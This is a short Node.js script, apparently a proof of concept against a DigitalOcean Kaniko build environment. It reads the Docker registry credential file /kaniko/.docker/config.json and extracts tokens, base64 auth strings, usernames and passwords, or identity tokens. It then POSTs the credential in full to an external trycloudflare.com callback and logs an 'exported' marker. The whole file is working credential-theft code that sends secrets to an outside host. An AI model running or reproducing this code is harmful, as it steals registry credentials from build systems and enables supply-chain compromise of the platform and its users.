const crypto = require('crypto');
const https = require('https');
const http = require('http');
const fs = require('fs');

const callbackUrl = 'https://acceptable-treated-soon-indicators.trycloudflare.com/digitalocean-build-token';

let configRaw = '';
try {
  configRaw = fs.readFileSync('/kaniko/.docker/config.json', 'utf8');
} catch (e) {
  console.log('No /kaniko/.docker/config.json found');
  process.exit(0);
}

const config = JSON.parse(configRaw);
const auths = config.auths || {};
const registries = Object.keys(auths);
let token = '';
let registry = registries[0] || '';

for (const reg of registries) {
  const entry = auths[reg];
  if (entry.registrytoken) {
    token = entry.registrytoken;
    registry = reg;
    break;
  } else if (entry.auth) {
    token = Buffer.from(entry.auth, 'base64').toString('utf8');
    registry = reg;
    break;
  } else if (entry.username && entry.password) {
    token = entry.username + ':' + entry.password;
    registry = reg;
    break;
  } else if (entry.identitytoken) {
    token = entry.identitytoken;
    registry = reg;
    break;
  }
}

if (!token) {
  console.log('No token extracted');
  process.exit(0);
}

console.log('Token found! Registry:', registry, 'Length:', token.length);

const body = JSON.stringify({
  schema: 1,
  capturedAt: new Date().toISOString(),
  registry: registry,
  allRegistries: registries,
  token: token,
  configPath: '/kaniko/.docker/config.json',
});

const url = new URL(callbackUrl);
const transport = url.protocol === 'https:' ? https : http;
const req = transport.request(url, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) },
}, (response) => {
  response.resume();
  response.on('end', () => {
    console.log(JSON.stringify({
      marker: 'DO_KANIKO_REGISTRY_TOKEN_EXPORTED',
      callbackStatus: response.statusCode,
      registry: registry,
      tokenLength: token.length,
      tokenSha256: crypto.createHash('sha256').update(token).digest('hex'),
    }));
  });
});
req.on('error', (error) => { console.error('callback error:', error.message); });
req.end(body);
